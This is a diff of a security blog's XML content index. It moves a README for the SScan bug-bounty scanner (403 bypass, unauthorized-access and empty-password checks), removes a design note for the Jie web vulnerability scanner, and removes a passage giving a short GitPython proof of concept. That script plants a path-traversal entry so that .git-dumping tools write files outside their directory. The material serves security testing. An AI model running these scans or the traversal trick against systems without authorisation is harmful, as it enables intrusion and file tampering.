@@ -808,153 +808,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Jie 扫描器</title>
-    <url>/2023/03/06/Jie%20%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
-    <content><![CDATA[<h2 id="劫-开发中-持续更新中"><a href="#劫-开发中-持续更新中" class="headerlink" title="劫(开发中,持续更新中)"></a>劫(开发中,持续更新中)</h2><p>具体漏洞开发详情，请移步 <a href="https://jie.fireline.fun/">https://jie.fireline.fun/</a></p>
-<p>基于浏览器爬虫开发的web漏洞主动 (被动) 扫描器</p>
-<p>由于扫描器只是粗暴的调用 xray、nuclei ，不优雅，而且 xray 不开源，不开源的东西我加入自己的扫描器用着不舒服(纯属给自己挖坑，就当给自己加深漏洞理解了，开发中代码很烂勿喷)。于是产生一个想法，将漏扫类项目拆分出来，重新糅合成一个轮子。</p>
-<p>目前打算设计成两种模式:</p>
-<ul>
-<li>一种被动 优先级低</li>
-<li>一种主动</li>
-</ul>
-<h2 id="已有功能"><a href="#已有功能" class="headerlink" title="已有功能"></a>已有功能</h2><ul>
-<li>Chrome Headless 爬虫, 爬取中进行指纹识别(katana)</li>
-<li>指纹识别，根据指纹识别进行漏洞检测(nuclei)</li>
-<li>基础漏洞扫描 (sql、xss 等) 待优化</li>
-<li>目录扫描(bbscan规则)</li>
-<li><del>一些端口弱口令爆破</del>(这还要在加上端口扫描，先去除)</li>
-</ul>
-<h2 id="语言环境识别"><a href="#语言环境识别" class="headerlink" title="语言环境识别"></a>语言环境识别</h2><p>防止对 php 的网站调用 java 的扫描插件</p>
-<h2 id="插件调用-后期看看有没有必要吧"><a href="#插件调用-后期看看有没有必要吧" class="headerlink" title="插件调用(后期看看有没有必要吧)"></a>插件调用(后期看看有没有必要吧)</h2><p>插件如何调用？ 这里直接放弃，只要代码逻辑写好就行了，后期或者有重构的想法</p>
-<p><del>仿照awvs设计了插件类别</del></p>
-<p><del>PerFile 对每个文件处理,包括文件后面的参数</del></p>
-<p><del>PerFolder 对每个目录处理</del></p>
-<p><del>PerScheme 对每个域名处理</del></p>
-<p><del>PostScan 对Post请求的处理</del></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><p><a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></p>
-<p>添加了无头浏览器检测绕过 <a href="https://bot.sannysoft.com/">https://bot.sannysoft.com/</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202303062213518.png" alt="BypassHeadlessDetect.png"></p>
-<h3 id="被动扫描代理"><a href="#被动扫描代理" class="headerlink" title="被动扫描代理"></a>被动扫描代理</h3><p><a href="https://github.com/lqqyt2423/go-mitmproxy">https://github.com/lqqyt2423/go-mitmproxy</a></p>
-<h3 id="Xss"><a href="#Xss" class="headerlink" title="Xss"></a>Xss</h3><p><a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a> 什么玩意，发的包也太多了，后续去掉</p>
-<p><a href="https://github.com/ac0d3r/xssfinder">https://github.com/ac0d3r/xssfinder</a></p>
-<p><a href="https://github.com/kleiton0x00/ppmap">https://github.com/kleiton0x00/ppmap</a></p>
-<h3 id="SQL-注入-TODO"><a href="#SQL-注入-TODO" class="headerlink" title="SQL 注入  TODO"></a>SQL 注入  TODO</h3><p>提取 <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> 中关于检测的代码，提取一部分思想就行了</p>
-<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>通过指纹识别进行对应的漏洞检测</p>
-<p>todo 不内置 nuclei 的 yml 文件，改为官方在线下载、更新</p>
-<p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p>
-<p>xray poc  中有些写的不规范，导致解析有问题，需要修改<br>比如：<br>response.status &#x3D;&#x3D; 200 &amp;&amp; response.headers[“content-type”] &#x3D;&#x3D; “text&#x2F;css” &amp;&amp; response.body.bcontains(b”$_GET[‘css’]”)</p>
-<p>content-type 应为 Content-Type</p>
-<p>但又好像是解析有问题</p>
-<p>不使用 xray 的 poc，只使用 nuclei 的 yml 文件<br>一起使用还要整理，防止重复扫描，nuclei-template 的 poc 已经够了</p>
-<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p><a href="https://github.com/wrenchonline/glint">https://github.com/wrenchonline/glint</a> 作者设计的我看不懂，自己重来</p>
-<p><a href="https://github.com/veo/vscan">https://github.com/veo/vscan</a>	</p>
-<h3 id="一些其他漏洞"><a href="#一些其他漏洞" class="headerlink" title="一些其他漏洞"></a>一些其他漏洞</h3><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p><a href="https://github.com/a1phaboy/FastjsonScan">https://github.com/a1phaboy/FastjsonScan</a></p>
-]]></content>
-      <categories>
-        <category>开源工具</category>
-      </categories>
-      <tags>
-        <tag>开源工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SScan  一款src捡洞扫描器</title>
-    <url>/2021/01/11/SScan/</url>
-    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
-<p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产<strong>捡洞</strong>和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p>
-<p>目前 <a href="https://github.com/yhy0/SScan">SScan</a> 的主要逻辑还是 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>。</p>
-<h3 id="使用效果图"><a href="#使用效果图" class="headerlink" title="使用效果图"></a>使用效果图</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p>
-<p>扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告</p>
-<h2 id="使用及参数"><a href="#使用及参数" class="headerlink" title="使用及参数"></a>使用及参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 SScan.py version                                查看版本</span><br><span class="line">python3 SScan.py --<span class="built_in">help</span>                                 获取帮助</span><br><span class="line">python3 SScan.py --host example.com run                 单个目标</span><br><span class="line">python3 SScan.py --file domains.txt run                 读取一个.txt文件</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/dirs/ run    读取目录下的所有.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，</span><br><span class="line">                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    只使用指定脚本 </span><br><span class="line"></span><br><span class="line">您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务</span><br><span class="line"></span><br><span class="line">其它参数：</span><br><span class="line">    --t             扫描线程数, 默认10。</span><br><span class="line">    --full          处理所有子目录。 /x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True</span><br><span class="line">    --crawl         爬取主页的&lt;a&gt;标签， 默认为True</span><br><span class="line">    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True</span><br><span class="line">    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True</span><br><span class="line">    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下</span><br><span class="line">    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下</span><br><span class="line">    --script_only   只使用脚本进行扫描，不使用规则</span><br><span class="line">    --noscripts     不使用脚本扫描</span><br><span class="line">    --fofa       是否使用fofa扩大目标，默认为True，通过在lib/config/setting.py </span><br></pre></td></tr></table></figure>
-
-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
-<li><p><input checked="" disabled="" type="checkbox"> 
-常见目录扫描，比如备份文件、配置文件、日志文件等等，具体见<code>rules</code>目录下的详细规则</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-信息泄露漏洞，比如.idea、 .git、.DS_Store、springboot等等，具体见<code>rules</code>目录下的详细规则</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-后台登录页面资产发现</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-403页面绕过，具体绕过规则在<code>lib/common/scanner.py</code>的196行的<code>bypass_403</code>函数</p>
-<p>  使用BurpSuite 实验室<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> 进行测试</p>
-<p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-扫描某个网段，比如通过 <code>--network 24</code> 指定扫描C段资产，进行漏洞和信息发现</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-跳过存在CDN的IP，当检测到url解析的IP符合CDN特征时，不会将ip加入扫描目标中，只会扫描url</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-一些常见未授权和弱口令检测，目前支持：</p>
-<p>  redis、Hadoop、Hadoop yarn、docker、docker registry api、CouchDB、ftp、zookeeper、elasticsearch、memcached、mongodb、rsync、jenkins、jboss的未授权访问，mysql空口令、PostgreSQL 空口令 ，具体见<code>pocs/scripts</code> 目录</p>
-<p>  对于数据库口令检测，目前只是检测是否存在空口令检测，后续会考虑要不要加入一些弱口令，进行检测。像这样 <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-当在<code> lib/config/setting.py</code>  文件中指定fofa api 信息时，会调用fofa接口，搜索更多的Web服务</p>
-</li>
-</ul>
-<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ul>
-<li><input disabled="" type="checkbox"> <del>将<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>项目中的一些功能集成进去，能够对js文件中的敏感信息、API进行测试</del>，添加此功能有点臃肿，而且有现成的(不是我懒)，1.0版本准备添加指纹识别，记录一个目标的各种信息，并生成报告，后续可以筛选出目标使用<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> 进行批量扫描</li>
-<li><input disabled="" type="checkbox"> 1.0版本添加指纹识别，记录一个目标的各种信息，并生成报告。</li>
-<li><input disabled="" type="checkbox"> 继续优化各模块</li>
-</ul>
-<h2 id="rules目录下的规则描述"><a href="#rules目录下的规则描述" class="headerlink" title="rules目录下的规则描述"></a>rules目录下的规则描述</h2><ul>
-<li><p>black.list 规则黑名单，命中则跳过</p>
-</li>
-<li><p>White.list 规则白名单 ，命中则认为存在薄弱点，加入结果</p>
-</li>
-<li><p>rules目录下的一些字段含义，rules目录下常见的格式就是这种</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/applicationContext-slave.xml &#123;tag=&quot;&lt;?xml&quot;&#125; &#123;status=200&#125; &#123;type=&quot;xml&quot;&#125; &#123;root_only&#125;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p><code>/WEB-INF/applicationContext-slave.xml </code>目录 ，必有</p>
-</li>
-<li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>可选， 如果有的话，会比对 response.text ,即返回的html页面中是否存在tag，若没有，认为不存在该目录。</p>
-</li>
-<li><p><code>&#123;status=200&#125; </code>可选， 目录对应的状态码， 也是 作为判断该目录是否存在的一个条件，会比对页面的状态码和规则的状态码一致 </p>
-</li>
-<li><p><code>&#123;type=&quot;xml&quot;&#125;</code> 可选，与返回头信息 content-type 字段比对，也是判断目录存在的一个条件</p>
-</li>
-<li><p><code>&#123;root_only&#125;</code> 可选， 这个是表示该目录只在网站根目录下存在，之后与网站根目录拼接，进行检测，比如 <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> 这样检查一次， 在 <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> 这样的二级目录，并不会拼接检查，提高效率 ，</p>
-<p> ps：必有：是指当想要自己添加规则时，必须添加的字段，可选：可以没有，但想要更加准确，最好写上。</p>
-<p> 具体匹配检测在<code>lib/common/scanner.py</code> 的523行</p>
-</li>
-</ol>
-</li>
-</ul>
-<h2 id="如何编写脚本插件"><a href="#如何编写脚本插件" class="headerlink" title="如何编写脚本插件"></a>如何编写脚本插件</h2><p>请参考scripts文件夹下的插件内容。self参数是一个Scanner对象(lib&#x2F;common&#x2F;scanner.py)，可使用Scanner对象的任意方法、属性。</p>
-<p><code>self.host</code> <code>self.port</code> 是目标主机和端口</p>
-<p><code>self.ports_open</code> 是开放的端口列表，是所有插件共享的。 一般不在插件执行过程中再单独扫描端口</p>
-<p><code>self.session</code> 是HTTP连接池</p>
-<p><code>self.http_request</code> 可发起HTTP GET请求</p>
-<p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> 是请求首页后返回的，一旦扫描器发现有插件依赖，会预先请求首页，保存下来，被所有插件公用</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li>
-<li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li>
-<li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">记一次403绕过技巧</a></li>
-<li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncio并发编程</a></li>
-<li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li>
-<li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li>
-</ul>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。<br>    如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。<br>    除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。<br>    您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
-<h2 id="Star趋势"><a href="#Star趋势" class="headerlink" title="Star趋势"></a>Star趋势</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>
-      </p>
-]]></content>
-      <categories>
-        <category>开源工具</category>
-      </categories>
-      <tags>
-        <tag>开源工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows提权-BypassUAC之劫持注册表实验</title>
     <url>/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</url>
     <content><![CDATA[<blockquote>
@@ -1055,6 +908,102 @@
       </tags>
   </entry>
   <entry>
+    <title>SScan  一款src捡洞扫描器</title>
+    <url>/2021/01/11/SScan/</url>
+    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
+<p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产<strong>捡洞</strong>和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p>
+<p>目前 <a href="https://github.com/yhy0/SScan">SScan</a> 的主要逻辑还是 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>。</p>
+<h3 id="使用效果图"><a href="#使用效果图" class="headerlink" title="使用效果图"></a>使用效果图</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p>
+<p>扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告</p>
+<h2 id="使用及参数"><a href="#使用及参数" class="headerlink" title="使用及参数"></a>使用及参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 SScan.py version                                查看版本</span><br><span class="line">python3 SScan.py --<span class="built_in">help</span>                                 获取帮助</span><br><span class="line">python3 SScan.py --host example.com run                 单个目标</span><br><span class="line">python3 SScan.py --file domains.txt run                 读取一个.txt文件</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/dirs/ run    读取目录下的所有.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，</span><br><span class="line">                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    只使用指定脚本 </span><br><span class="line"></span><br><span class="line">您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务</span><br><span class="line"></span><br><span class="line">其它参数：</span><br><span class="line">    --t             扫描线程数, 默认10。</span><br><span class="line">    --full          处理所有子目录。 /x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True</span><br><span class="line">    --crawl         爬取主页的&lt;a&gt;标签， 默认为True</span><br><span class="line">    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True</span><br><span class="line">    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True</span><br><span class="line">    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下</span><br><span class="line">    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下</span><br><span class="line">    --script_only   只使用脚本进行扫描，不使用规则</span><br><span class="line">    --noscripts     不使用脚本扫描</span><br><span class="line">    --fofa       是否使用fofa扩大目标，默认为True，通过在lib/config/setting.py </span><br></pre></td></tr></table></figure>
+
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
+<li><p><input checked="" disabled="" type="checkbox"> 
+常见目录扫描，比如备份文件、配置文件、日志文件等等，具体见<code>rules</code>目录下的详细规则</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+信息泄露漏洞，比如.idea、 .git、.DS_Store、springboot等等，具体见<code>rules</code>目录下的详细规则</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+后台登录页面资产发现</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+403页面绕过，具体绕过规则在<code>lib/common/scanner.py</code>的196行的<code>bypass_403</code>函数</p>
+<p>  使用BurpSuite 实验室<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> 进行测试</p>
+<p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+扫描某个网段，比如通过 <code>--network 24</code> 指定扫描C段资产，进行漏洞和信息发现</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+跳过存在CDN的IP，当检测到url解析的IP符合CDN特征时，不会将ip加入扫描目标中，只会扫描url</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+一些常见未授权和弱口令检测，目前支持：</p>
+<p>  redis、Hadoop、Hadoop yarn、docker、docker registry api、CouchDB、ftp、zookeeper、elasticsearch、memcached、mongodb、rsync、jenkins、jboss的未授权访问，mysql空口令、PostgreSQL 空口令 ，具体见<code>pocs/scripts</code> 目录</p>
+<p>  对于数据库口令检测，目前只是检测是否存在空口令检测，后续会考虑要不要加入一些弱口令，进行检测。像这样 <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+当在<code> lib/config/setting.py</code>  文件中指定fofa api 信息时，会调用fofa接口，搜索更多的Web服务</p>
+</li>
+</ul>
+<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ul>
+<li><input disabled="" type="checkbox"> <del>将<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>项目中的一些功能集成进去，能够对js文件中的敏感信息、API进行测试</del>，添加此功能有点臃肿，而且有现成的(不是我懒)，1.0版本准备添加指纹识别，记录一个目标的各种信息，并生成报告，后续可以筛选出目标使用<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> 进行批量扫描</li>
+<li><input disabled="" type="checkbox"> 1.0版本添加指纹识别，记录一个目标的各种信息，并生成报告。</li>
+<li><input disabled="" type="checkbox"> 继续优化各模块</li>
+</ul>
+<h2 id="rules目录下的规则描述"><a href="#rules目录下的规则描述" class="headerlink" title="rules目录下的规则描述"></a>rules目录下的规则描述</h2><ul>
+<li><p>black.list 规则黑名单，命中则跳过</p>
+</li>
+<li><p>White.list 规则白名单 ，命中则认为存在薄弱点，加入结果</p>
+</li>
+<li><p>rules目录下的一些字段含义，rules目录下常见的格式就是这种</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/applicationContext-slave.xml &#123;tag=&quot;&lt;?xml&quot;&#125; &#123;status=200&#125; &#123;type=&quot;xml&quot;&#125; &#123;root_only&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><code>/WEB-INF/applicationContext-slave.xml </code>目录 ，必有</p>
+</li>
+<li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>可选， 如果有的话，会比对 response.text ,即返回的html页面中是否存在tag，若没有，认为不存在该目录。</p>
+</li>
+<li><p><code>&#123;status=200&#125; </code>可选， 目录对应的状态码， 也是 作为判断该目录是否存在的一个条件，会比对页面的状态码和规则的状态码一致 </p>
+</li>
+<li><p><code>&#123;type=&quot;xml&quot;&#125;</code> 可选，与返回头信息 content-type 字段比对，也是判断目录存在的一个条件</p>
+</li>
+<li><p><code>&#123;root_only&#125;</code> 可选， 这个是表示该目录只在网站根目录下存在，之后与网站根目录拼接，进行检测，比如 <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> 这样检查一次， 在 <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> 这样的二级目录，并不会拼接检查，提高效率 ，</p>
+<p> ps：必有：是指当想要自己添加规则时，必须添加的字段，可选：可以没有，但想要更加准确，最好写上。</p>
+<p> 具体匹配检测在<code>lib/common/scanner.py</code> 的523行</p>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="如何编写脚本插件"><a href="#如何编写脚本插件" class="headerlink" title="如何编写脚本插件"></a>如何编写脚本插件</h2><p>请参考scripts文件夹下的插件内容。self参数是一个Scanner对象(lib&#x2F;common&#x2F;scanner.py)，可使用Scanner对象的任意方法、属性。</p>
+<p><code>self.host</code> <code>self.port</code> 是目标主机和端口</p>
+<p><code>self.ports_open</code> 是开放的端口列表，是所有插件共享的。 一般不在插件执行过程中再单独扫描端口</p>
+<p><code>self.session</code> 是HTTP连接池</p>
+<p><code>self.http_request</code> 可发起HTTP GET请求</p>
+<p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> 是请求首页后返回的，一旦扫描器发现有插件依赖，会预先请求首页，保存下来，被所有插件公用</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li>
+<li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li>
+<li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">记一次403绕过技巧</a></li>
+<li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncio并发编程</a></li>
+<li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li>
+<li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li>
+</ul>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。<br>    如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。<br>    除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。<br>    您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
+<h2 id="Star趋势"><a href="#Star趋势" class="headerlink" title="Star趋势"></a>Star趋势</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>
+      </p>
+]]></content>
+      <categories>
+        <category>开源工具</category>
+      </categories>
+      <tags>
+        <tag>开源工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows系统散列值获取</title>
     <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
     <content><![CDATA[<blockquote>
@@ -1136,60 +1085,6 @@
       <tags>
         <tag>Windows提权</tag>
         <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git 蜜罐复现</title>
-    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<blockquote>
-<p>  好久不见</p>
-</blockquote>
-<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>python3 -m pip install GitPython</code></p>
-<p>python3 运行, 生成Poc </p>
-<blockquote>
-<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
-</blockquote>
-<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
-<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
-<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174743.png" alt="image-20210809154939407"></p>
-<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
